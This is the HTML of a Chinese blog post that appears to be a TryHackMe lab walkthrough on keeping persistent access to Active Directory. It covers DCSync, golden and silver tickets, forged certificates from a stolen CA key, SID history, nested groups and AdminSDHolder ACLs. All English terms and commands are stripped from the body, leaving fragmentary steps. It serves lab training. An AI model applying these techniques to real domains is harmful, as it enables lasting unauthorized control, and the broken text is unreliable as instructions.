<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-Persisting Active Directory | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-Persisting Active Directory"><meta name="application-name" content="THM-Persisting Active Directory"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-Persisting Active Directory"><meta property="og:url" content="http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 简介 该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="0x01 简介 该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-Persisting Active Directory',
  postAI: '',
  pageFillDescription: '0x01 简介, AD 维持, 学习目标, 索取您的凭证, 0x02 通过凭证进行持久化, 恭喜你, DC Sync（同步）, 并非所有凭证都是一样的, DC同步全部, 0x03 通过票据持久化, 巧克力工厂门票, 黄金票据, 白银票据, 伪造门票以获取乐趣和利润, 0x04 通过证书进行持久化, AD CS回归, 提取私钥, 生成我们自己的证书, 我们不再是蓝队的朋友, 0x05 通过 SID 历史记录进行持久化, 锻造历史, 蓝队的干草叉和火把, 0x06 通过组成员身份实现持久性, 通过团体成员身份坚持下去, Nested Groups(嵌套组), 基于嵌套组实现权限维持, 烦人的不仅仅是蓝队, 0x07 通过ACL进行持久化, 使用AD组模板, 使用AdminSDHolder容器(修改其ACLs)实现权限维持, 手动启动SDProp进程, 蓝队正在走下坡路, 0x08 通过GPO实现持久化, 介绍, 前期准备工作, 创建GPO, 隐藏GPO, 0x09 总结, 其他域权限维持技术, 缓解域权限维持威胁的措施简介该网络是和网络的延续请确保先完成这些网络然后再继续此操作另请注意我们将广泛讨论对象如果您需要复习一下请快速浏览一下这个房间现在我们已经利用了并取得了一些可以执行我们目标的位置我们需要确保我们部署持久性以确保蓝队不能直接把我们踢出去在此网络中我们将探索可用于在中持久化的几种不同方法维持在攻击的过程中我们需要确保部署持久性这将确保蓝队无法通过简单地轮换一些凭证来将我们踢出局如前所述的破坏过程是循环的当我们损害财产时我们会部署持久性而不仅仅是在最后这确保了如果我们的一个位置被蓝队烧毁我们有几个后备方案在此持久阶段我们将使用多种技术来确保我们获得的访问权限不会被简单地撤销这些持久性技术取决于我们迄今为止获得的特定权限和特权学习目标在这个网络中我们将介绍几种可用于在中持久化的方法这绝不是一个完整的列表因为可用的方法通常是高度情境化的并且依赖于结构和环境但是我们将介绍以下持久技术凭据和银票和金票安全标识符访问控制列表组策略对象索取您的凭证为了模拟违规您将获得第一组凭据网络设置完成后在攻击箱上导航至以请求您的凭据对单击获取凭据按钮以接收可用于初始访问的凭据对此凭据对将为您提供对的和访问权限可以被视为进入该环境的跳转主机模拟您已实现的立足点跳转主机经常成为红队的目标因为它们提供对新网段的访问您可以使用或任何其他类似的远程桌面客户端连接到该主机以进行连接时记得指定的域名对于访问您可以使用以下命令出现提示时提供您帐户的关联密码尽管可用于所有任务但速度更快通过凭证进行持久化恭喜你恭喜疲惫的旅行者在突破执行枚举并一路利用它到顶部如果你按顺序完成了这些网络之后你终于到达了持久性的酒馆艰苦的工作已经结束现在是时候享受一些乐趣了虽然持久性仍然是一件严肃的事情但它确实不像其他阶段那么有压力在这里我们可以尽情发挥我们的创造力所以在我们的小酒馆里休息一下您疲惫的骨头给自己泡一杯好茶然后我们就开始吧连同您的低特权凭据您将获得域管理员凭据多么幸运啊在讨论持久性技术时您将使用特权凭据对低特权凭据集执行持久性技术记下以下帐户用户名密码域由于我们为您提供对整个域的完全访问权限因此我们无法真正隐藏任何标志或强迫您确保在回答问题之前自己执行这些持久性技术不过我们鼓励您花时间尝试这些方法因为当蓝队开始将您踢出局时它们将作为红队评估的回报我们将讨论的第一个也是最不可靠的持久性技术是凭证前面讨论的一些横向技术可能会导致攻击者获得凭证的访问权限当使用凭据一词时它可能意味着用户名和密码对但在上下文中即使是密码哈希也足以通过哈希传递技术进行身份验证同步在大型组织中每个域只有一个域控制器是不够的这些域通常在多个区域位置使用并且拥有单个会显着延迟中的任何身份验证服务因此这些组织使用多个那么问题就变成了您如何在两个不同的办公室使用相同的凭据进行身份验证这个问题的答案是域复制每个域控制器都运行一个称为知识一致性检查器的进程为林生成复制拓扑并通过远程过程调用自动连接到其他域控制器以同步信息这包括更新的信息例如用户的新密码和新对象例如创建新用户的时间这就是为什么您在更改密码后通常必须等待几分钟才能进行身份验证因为发生密码更改的可能与您进行身份验证的不同复制过程称为同步不仅仅是可以启动复制属于域管理员组的帐户也可以出于合法目的例如创建新的域控制器执行此操作一种流行的攻击是同步攻击如果我们有权访问具有域复制权限的帐户我们可以发起同步攻击以从获取凭据并非所有凭证都是一样的在开始同步攻击之前我们首先讨论一下我们可能会寻找哪些凭据虽然我们应该始终寻求转储特权凭据例如域管理员组成员的凭据但这些也是首先要轮换的凭据蓝队术语意思是重置帐户密码因此如果我们只有特权凭证可以肯定地说一旦蓝队发现我们他们就会轮换这些帐户我们可能会失去访问权限那么我们的目标就是坚持拥有接近特权的凭证我们并不总是需要王国的完整钥匙我们只需要足够的钥匙来确保我们仍然能够实现目标执行并始终让蓝队保持警惕因此我们应该尝试通过如下凭证来持久保存在多台计算机上具有本地管理员权限的凭据通常组织有一两个对几乎所有计算机具有本地管理权限的组这些组通常分为一组用于工作站一组用于服务器通过获取这些团体成员的凭据我们仍然可以访问该庄园中的大部具有委派权限的服务帐户有了这些账户我们就能够强制金票和银票执行委托攻击用于特权服务的帐户如果我们泄露了特权服务例如或的帐户我们可以利用漏洞再次获得特权立足点当谈到要转储和保留哪些凭证时它受到很多因素的影响您必须发挥创意并根据具体情况进行思考然而对于这个房间我们将享受一些乐趣让蓝队流汗并放弃我们能得到的每一份凭证同步全部我们将使用来获取凭证使用帐户通过登录并加载让我们首先对我们自己的单个帐户执行同步您将看到相当多的输出包括您帐户当前的哈希值您可以通过使用此类网站将您的密码转换为哈希来验证哈希是否正确这很棒但我们希望同步每个帐户为此我们必须在上启用日志记录确保将更改为您的用户名以免覆盖其他用户的日志转储现在我们将使用标志而不是指定我们的帐户这将需要一些时间才能完成完成后退出以完成转储查找然后您可以下载文件您可以使用恢复所有用户名使用恢复所有哈希值现在我们可以执行离线密码破解攻击来恢复纯文本凭证或者简单地使用执行哈希传递攻击密码通过票据持久化正如前面任务中所讨论的我们经常希望通过具有委派权限的服务帐户来持久化伪造银票和金票但这些到底是什么为什么每次蓝队桌面演习结束时都会有人大喊冲掉所有金票和银票巧克力工厂门票在讨论金票和银票之前我们首先需要快速回顾一下身份验证下图显示了身份验证的正常流程用户在上向密钥分发中心发出请求其中包括使用用户的散列加密的时间戳本质上这是请求一个票据授予票据检查信息并将发送给用户这个使用仅存储在上的帐户的密码哈希进行签名现在用户可以将这个发送给以请求对用户想要访问的资源的票据授予服务如果检查通过将响应该使用用户请求访问的服务的散列加密然后用户将这个提交给服务进行访问服务可以验证因为它知道自己的散列并可以授予用户访问权限说了所有这些背景理论后是时候研究一下金票和银票了黄金票据金票是伪造的这意味着我们绕过上图中的步骤和向证明我们是谁拥有特权帐户的有效我们现在可以为几乎任何我们想要的服务请求为了伪造金票我们需要帐户的密码哈希以便我们可以为我们想要的任何用户帐户签署关于金票的一些有趣的说明通过在进程的此阶段进行注入我们不需要要模拟的帐户的密码哈希因为我们绕过了该步骤仅用于证明上的对其进行了签名由于它是由哈希签名的因此该验证通过并且无论其内容如何都被声明为有效说到内容只会验证中指定的用户帐户如果该帐户早于分钟这意味着我们可以将禁用删除或不存在的帐户放入只要我们确保时间戳不超过分钟它就有效由于票证的策略和规则是在本身中设置的因此我们可以覆盖推送的值例如票证只能在小时内有效例如我们可以确保我们的有效期为年从而赋予我们持久性默认情况下帐户的密码永远不会更改这意味着一旦我们拥有密码除非手动轮换否则我们可以通过永久生成来获得持久访问权限蓝队必须将帐户的密码轮换两次因为当前密码和以前的密码对该帐户仍然有效这是为了确保密码的意外轮换不会影响服务轮换帐户的密码对于蓝队来说是一项非常痛苦的过程因为这将导致环境中的大量服务停止工作他们可能认为自己拥有一个有效的有时甚至会持续几个小时但那个已经失效了并非所有的服务都足够智能能够在失效后释放它因为时间戳仍然有效因此它们不会自动请求一个新的黄金票据甚至可以让您绕过智能卡验证因为在创建之前智能卡是由验证的除了帐户的密码哈希之外我们只需要域名域和我们想要模拟的人的用户如果我们处于可以恢复帐户密码哈希的位置那么我们已经处于可以恢复其他所需信息的位置了白银票据银票是伪造的票因此现在我们跳过与上的进行的所有通信上图中的步骤而只与我们想要直接访问的服务进行交互关于银票的一些有趣的说明生成的由我们目标主机的机器帐户签名金票和银票之间的主要区别在于我们获得的特权数量如果我们拥有帐户的密码哈希值我们就可以访问所有内容使用银票由于我们只能访问我们正在攻击的服务器的计算机帐户的密码哈希因此我们只能模拟该主机本身的用户银票的范围仅限于特定服务器上的任何服务由于是伪造的所以没有关联的这意味着从未被联系过这使得攻击非常危险因为唯一可用的日志将在目标服务器上因此虽然范围更有限但对于蓝队来说检测起来要困难得多由于权限是通过确定的因此我们可以再次为银票证创建一个不存在的用户只要我们确保该票证具有将用户置于主机的本地管理员组中的相关机器帐户的密码通常每天轮换一次这不利于持久性但是我们可以利用提供的访问权限来访问主机注册表并更改负责机器帐户密码轮换的参数从而确保机器帐户保持静态并授予我们在机器上的持久性虽然只能访问单个主机可能看起来是一个显著的降级但机器帐户可以像普通的帐户一样使用不仅允许您对主机进行管理员访问还可以继续像使用用户帐户一样枚举和利用伪造门票以获取乐趣和利润现在我们已经解释了金票和银票的基础知识让我们生成一些您将需要帐户的哈希值由于在上一个任务中执行了同步您现在应该拥有该哈希值此外记下与计算机帐户关联的哈希值因为我们需要这个哈希值作为银票您可以在执行的转储中找到此信息我们需要的最后一条信息是域使用上的低特权终端我们可以使用来恢复此信息输入以下命令获取到相关信息现在我们已经拥有了所有必需的信息我们可以重新启动加载后执行以下操作以生成黄金票证参数解释我们要模拟的用户名这不必是有效用户我们要为其生成票证的域的用户默认情况下使用这是默认的管理员帐户我们要为其生成票证的域的帐户的哈希值票证有效期默认情况下生成一张有效期为年的票证默认的策略是小时分钟续订的最长票证生命周期默认情况下生成一张有效期为年的票证默认的策略是天分钟该标志告诉将票证直接注入会话中这意味着它已准备好使用我们可以通过对域控制器运行命令来验证黄金票证是否正常工作在这里我又另起了一个会话接着输入以上命令发现没有权限接着我在原上试了试发现成功即使黄金票据的有效期非常长蓝队仍然可以通过简单地两次轮换密码来防御如果我们真的想深入了解我们希望生成白银票据这些票据不太可能被发现并且更难以防御因为必须轮换每个机器帐户的密码我们可以使用以下命令来生成白银票据参数解释我们要模拟的用户名这不必是有效用户我们要为其生成票证的域的用户默认情况下使用这是默认的管理员帐户我们要为其生成票证的域的我们的目标服务器的主机名让我们做但它可以是任何加入域的主机我们的目标计算机帐户的哈希值查看同步结果以查找的哈希值表示它是一个机器帐户我们在中请求的服务是一个安全的选择因为它允许文件访问该标志告诉将票证直接注入会话中这意味着它已准备好使用我们可以通过对运行命令来验证银票是否正常工作通过证书进行持久化这里有一个快速说明从现在开始讨论的技术具有令人难以置信的侵入性并且难以消除即使您已批准红队练习来执行这些技术您在执行这些技术时也必须格外小心在现实场景中利用大多数这些技术将导致完整的域重建确保您完全了解使用这些技术的后果并且仅在您的评估事先获得批准并且认为有必要时才执行这些技术在大多数情况下红队演习此时将被取消而不是使用这些技术这意味着您很可能不会执行这些持久性技术而是模拟它们最后两种持久性技术依赖于凭据虽然我们肯定可以让蓝队的生活变得复杂但他们最终可以轮换足够的凭据来将我们踢出去因此虽然这些技术在让蓝队忙碌的同时保持着它们的忙碌很好但我们应该寻找使用不依赖凭据的持久性技术这意味着这些凭据的轮换不会将我们踢出去我们将首先看看的是证书回归在利用室中我们利用证书成为域管理员但是证书也可用于持久性我们所需要的只是一个可用于客户端身份验证的有效证书这将允许我们使用证书来请求这有什么美感我们可以继续请求无论他们在我们攻击的账户上进行了多少轮换我们被踢出的唯一方法是他们撤销我们生成的证书或者证书过期这意味着我们可能在接下来的大约年里默认拥有持久访问权限如果您有兴趣了解有关请求证书并将其用于身份验证的最新信息请转到利用或证书模板室然而在这个房间里我们并没有闲逛我们正在追查证书颁发机构本身根据我们的访问权限我们可以再进一步我们可以简单地窃取根证书的私钥以便在任何时候生成我们自己的证书更糟糕的是由于这些证书从未被颁发因此蓝队无法撤销它们对于蓝队来说这将是更糟糕的情况因为这意味着的轮换这意味着蓝队必须撤销所有已经颁发的证书才能将我们踢出去想象一下你刚刚花了两天的时间执行了域接管轮换了每个特权帐户的凭据重置了所有的黄金和白银票据只是为了意识到攻击者通过成为你的而持续存在糟糕提取私钥的私钥存储在服务器本身上如果私钥未通过基于硬件的保护方法例如硬件安全模块进行保护对于仅将证书服务用于内部目的的组织来说通常是这种情况则它会受到机器数据保护这意味着我们可以使用和等工具来提取证书从而从中提取私钥是使用最简单的工具但如果您想体验其他工具请看看这里使用任务中的管理员凭据使用对进行身份验证为您的用户创建一个唯一的目录移至该目录并加载我们先看看能否查看到上存储的证书我们可以看到上有证书我们还可以注意到其中一些证书被设置为不允许我们导出密钥如果没有这个私钥我们将无法生成新的证书幸运的是允许我们修补内存以使这些密钥可导出如果您收到错误请不要担心这只是意味着其他人在您之前执行了该补丁修补这些服务后我们可以使用导出证书导出的证书将以和格式存储到磁盘证书是我们特别感兴趣的证书为了导出私钥必须使用密码来加密证书默认情况下分配的密码为使用下载或复制此证书到您的然后将其复制到上的低权限用户的主目录如果您愿意还可以在自己的未加入域的计算机上执行其余步骤这里我不知为何我没有证书弄了半天是我连接对象搞错了生成我们自己的证书现在我们有了私钥和根证书我们可以使用工具为我们想要的任何用户伪造客户端身份验证证书和二进制文件存储在上的目录中让我们使用生成一个新证书这里我们需要将上述的文件传输到我们的上接着连接该域环境的计算机将该文件传输至该计算机上接下来使用工具生成证书参数解释我们导出的证书的路径用于加密证书的密码默认情况下分配的密码为证书的主题或通用名称对于我们使用证书的用途而言这并不重要这是我们要使用此证书模拟的帐户的用户主体名称它必须是合法用户将存储生成的证书的路径由于证书需要导出私钥用于身份验证因此我们必须设置一个用于加密它的新密码我们可以使用来使用证书请求以验证证书是否可信我们将使用以下命令我们来分解一下参数这指定我们将模拟的用户并且必须与我们生成的证书的相匹配指定票证的加密类型设置此项对于规避很重要因为默认加密算法很弱这会导致溢出警报我们生成的证书的路径我们的证书文件的密码将输出到的文件我们当前攻击的域的我们请求的域控制器的通常最好选择运行服务的执行命令后我们应该会收到但这里我总是报错如下图这里经过几篇文章的搜寻该报错原因是由于其不支持类型也就是该没有设置身份验证这里也是懵逼了尝试几次都失败感觉是环境问题但刚重置了还是出错不理解就先放出成果图现在我们可以使用加载并向进行身份验证我们不再是蓝队的朋友证书持久性的防御难度要大得多即使您轮换受感染帐户的凭据证书仍然有效消除持久性的唯一方法是吊销证书但是只有当我们通过合法渠道生成证书时这才可能实现由于我们导出了并自己生成了证书因此它不会出现在的已颁发证书列表中这意味着蓝队将无法撤销我们的证书那么消除持久性的唯一解决方案是什么好吧这就是为什么我们不再是朋友了他们必须吊销根证书但是吊销这个证书意味着颁发的所有证书都会突然失效这意味着他们必须为每个使用的系统生成新证书您应该开始明白为什么这种类型的持久性非常危险并且如果执行则需要完全重建系统这里又找了几篇文章找到了解决办法就是连接目标服务器更改一下配置使用弹窗执行或者在搜索栏中搜索编辑组策略计算机配置设置安全设置本地策略安全选项配置允许的加密类型右键编辑属性勾选需要的加密类型选项并确定即可编辑组策略计算机配置管理模版系统将设定为通过界面重启并退出界面然后继续在我们使用低权限用户所访问的跳板主机上进行操作之后再次尝试终于成功通过历史记录进行持久化安全标识符之前已讨论过但回顾一下用于在连接到资源时跟踪安全主体和帐户的访问权限然而帐户有一个有趣的属性称为历史记录历史记录的合法用例是使一个帐户的访问权限能够有效地克隆到另一个帐户当组织忙于执行迁移时这一点非常有用因为它允许用户在迁移到新域时保留对原始域的访问权限在新域中用户将拥有新的但我们可以将用户现有的添加到历史记录中这仍然允许他们使用新帐户访问先前域中的资源虽然历史记录有利于迁移但我们作为攻击者也可以滥用此功能来实现持久性历史可以是我们想要的任何样子问题是历史记录并不仅限于包含来自其他域的有了正确的权限我们只需将当前域的添加到我们控制的帐户的历史记录中即可关于这种持久性技术的一些有趣的注释我们通常需要域管理员权限或同等权限才能执行此攻击当帐户创建登录事件时与该帐户关联的将添加到用户的令牌中然后由该令牌确定与该帐户关联的权限这包括组如果我们注入企业管理员我们可以进一步采取这种攻击因为这会提升帐户的权限使其成为林中所有域中的域管理员由于已添加到用户的令牌中因此即使该帐户不是实际组的成员也会尊重权限这使得这是一种非常狡猾的持久方法我们拥有危害整个域也许是整个林所需的所有权限但我们的帐户可以只是一个普通用户帐户仅具有域用户组的成员身份通过始终使用此帐户来更改另一个帐户的历史记录我们可以将偷偷摸摸的行为提升到另一个级别因此初始持久性向量不那么容易被发现和补救锻造历史在下一步中使用管理员凭据在上获取一个会话在伪造历史之前让我们首先获取一些关于的信息首先确保我们的低权限用户当前没有任何历史信息可以看到这里历史为空这证实我们的用户当前没有设置任何历史记录让我们获取组的因为这是我们要添加到历史记录中的组我们可以使用之类的东西来添加历史记录然而最新版本的有一个缺陷不允许它修补来更新历史记录因此我们需要使用其他东西在这种情况下我们将使用工具直接修补文件即存储所有信息的数据库这里在下载的时候一直报错不知为何尝试了半天无果发现目标机已经有改工具了服务运行时数据库被锁定为了修补我们的历史记录我们必须首先停止该服务补丁完成后必须重新启动服务否则整个网络的认证将无法进行执行这些步骤后让我们使用低权限凭据通过登录到并验证是否已添加历史记录以及我们现在是否具有域管理员权限根据上面的输出效果很好我们能够伪造我们的历史记录授予我们的低特权帐户访问权限蓝队的干草叉和火把如果蓝队通过访问域内主机并使用用户和组管理单元那么蓝队将能够查看添加到当前用户的历史记录属性但是即使蓝队具有最高权限也无法通过界面直接删除用户的历史记录属性因为它是受保护的为了成功删除攻击者所添加的历史记录蓝队必须使用诸如之类的工具此外蓝队还必须先找到攻击者所修改的历史记录这需要蓝队成员主动过滤并查看用户的相关属性否则很难找到恶意的历史记录因为只有在用户进行身份验证时才会应用和使用这些历史记录想象一下您是蓝队正在处理刚刚执行域名回收的事件您将帐户的密码轮换了两次删除了金票和银票并从头开始重建了整个服务器只是为了看到攻击者仍在使用低权限帐户执行命令这不会是美好的一天通过组成员身份实现持久性如果我们不想篡改历史记录我们可以直接将自己添加到组中以实现持久化虽然历史记录是一种很好的持久性技术但凭证轮换和清理仍然可以消除我们的持久性在某些情况下通过针对组本身来执行持久性可能会更好通过团体成员身份坚持下去如任务所讨论的那样最高权限的帐户或组并不总是用于持久性的最佳选择比其他组更密切地监视了特权组的变化任何被归类为受保护组的组例如域管理员或企业管理员都会接受额外的安全审查因此如果我们想通过组成员身份持久存在我们可能需要在将我们自己的帐户添加到持久性的组时进行创造性的考虑组可用于获取诸如强制更改用户密码之类的特殊权限尽管在大多数情况下我们可能无法重置特权用户的密码但是我们能够尝试重置低特权用户的密码并继续将访问权限扩展到目标工作站目标域网络所提供的具有本地管理员权限的组通常不会像被保护组那样被密切监控我们可以通过修改组成员关系来拥有对目标主机的本地管理员权限此类权限维持技术并不总是与直接的特权有关有时具有间接特权例如对组策略对象的所有权的组也同样适合我们用来实现权限维持嵌套组在大多数企业网络环境中都存在大量的递归组递归组是指某个组是另一个组的成员我们可以认为这是组嵌套这种组嵌套可用于在域网络中创建更有组织性的结构以技术支持组为例是一个通用的组因此在这个组下面可能会有像和这样的子组我们可以将所有这些组作为成员添加到组中这将为子组中的所有用户分配与组相关联的权限和特权同时我们还可以为每个子组分配更细致的权限和特权虽然组嵌套有助于组织域网络但是它确实降低了关于那些具有有效访问权限的帐户的可见性再次以组为例如果我们向域查询组的成员它可能会告诉我们该组有三个成员然而这个数字并不真实因为组中的三个成员也可以是组为了更充分地了解具有有效访问权限的帐户数量我们还必须继续枚举组中的子组但是这些子组本身也可以有子组作为成员那么问题最终就变成了我们应该枚举多少层才能得到真正的具有有效访问权限的帐户数目这里的有效访问权限是指由于组成员关系而分配给某个帐户的权限多层组嵌套关系也会让蓝队更加难以监控权限分配情况假设当一个新成员被添加到组时会向蓝队发出警报这是一个很好的警报但是如果攻击者将用户添加到组中的子组中则可能并不会触发该警报这是一个非常常见的问题因为是由团队管理的而警报和监控则是由信息安全团队管理的我们作为攻击者所需要的是以上两个团队之间存在一些沟通上的错误那么当我们使用子组进行用户添加时就不会有警报消息被发送给蓝队作为攻击者我们可以利用这种被降低的权限分配可见性来尝试执行权限维持操作我们可以不将目标直接锁定在那些能让我们访问域的特权组上而是转而把注意力集中在子组上也就是说我们不添加直接新成员到那些可能会向蓝队发出警报的特权组中而是将低权限的用户添加到可能未被监控的那些子组中基于嵌套组实现权限维持我们首先使用帐户通过登录到跳板主机然后创建一个新的基础组并且将该组隐藏在组织单元中然后让我们在组织单元中创建另一个组并且将我们刚才的基础组作为组成员添加进来我们重复执行几次上述两个步骤每次都将前一个组添加为新的组的成员上述组名自定义即可现在让我们将上述所创建的最后一个组添加到域管理员组最后我们将低权限的用户添加到我们先前所创建的第一个组中完成上述操作之后我们的低权限用户将获得针对目标域控机器的访问特权我们可以使用该低权限用户通过访问跳板主机并执行相关命令来验证这一点回到我们之前使用帐户所建立的会话界面我们还可以验证一下即使我们创建了多个组域管理员组也只有一个新成员虽然这里很多组成员但这是由于这个靶机是共享的我们只需要关注之中的只有这一个烦人的不仅仅是蓝队如果是在现实的企业网络环境中我们不必创建新的组来进行组嵌套实际上我们完全可以利用现有的组来执行组嵌套操作然而这是我们在正常的红队评估行动中永远不会做的事情因为这种组嵌套操作会破坏企业组织的域网络结构如果这种破坏足够充分那么域网络结构将无法恢复这意味着即使蓝队能够将我们所获得的权限取消企业组织也很可能需要从头开始重建他们的整个网络结构这将会造成企业的重大损失通过进行持久化有时候我们可能不仅仅想要通过正常的组来实现权限维持而是希望基于所有受保护的组来进行权限维持使用组模板虽然我们可以向我们所能找到的每个特权组添加一个受我们控制的帐户但是蓝队仍然可以执行相关的清理操作并删除我们所添加的组成员为了确保更好进行权限维持我们可以尝试注入模板以生成默认组通过对这些模板执行注入操作即使蓝队删除了我们所添加的组成员我们也只需要等待模板刷新然后我们就能再次让我们所控制的帐户获得组成员资格一个我们可用的模板是容器该容器存在于每个域中我们能够以其访问控制列表为模板从而将权限复制到所有的受保护组中常见的受保护组包括等特权组如果想要查看关于受保护组的完整列表可以访问以下链接一个名为的进程能够获取容器的并可以每分钟将其应用于所有受保护组因此我们可以基于此进程编写一个访问控制条目它将授予我们对于所有受保护组的完全权限如果蓝队没有意识到这种类型的权限维持技术正在被使用那么他们将很难完全清除攻击者所获得的权限因为即使蓝队删除了那些基于受保护对象或者组的不恰当的权限之后相关的权限仍然会在一个小时内被重新分配由于这种重新授权是通过正常的过程来进行的因此这种操作也不会让蓝队收到任何警报提示这会让蓝队更加难以确定这种持久化权限的来源使用容器修改其实现权限维持为了基于容器来进行权限维持操作我们还将使用管理控制台我们首先会使用上文所提及的低权限的帐户来通过访问跳板主机然后在跳板机的终端中使用命令注入管理员凭据到当前会话中并启动另一个终端程序最后我们将从此新终端启动在新终端界面中执行以下命令这能让我们以管理员用户身份成功访问到域控制器上的控制台成功打开窗口之后我们向其添加用户和组管理单元并且选中目标域以启用高级功能然后我们就可以在下面找到组我们继续导航到该组的属性右键单击让我们在上述界面中添加我们所控制的低权限用户并且授予其完全控制权限点击添加搜索我们所能使用的低权限用户名称例如然后点击检查名称点击选择完全控制并点击允许点击应用点击添加成功之后具体结果将如下所示手动启动进程正常情况下我们可能需要等待分钟然后我们所添加的低权限用户将能够完全控制所有的受保护组这是因为安全描述符传播器服务每分钟会自动执行一次并且它会将我们所更改的访问控制列表传播到所有的受保护组的全称为安全描述符传播器由于等待时间过长我们将使用命令来手动启动该进程我们可以在目录下找到并使用脚本来手动启动上述所提及的进程使用访问域控制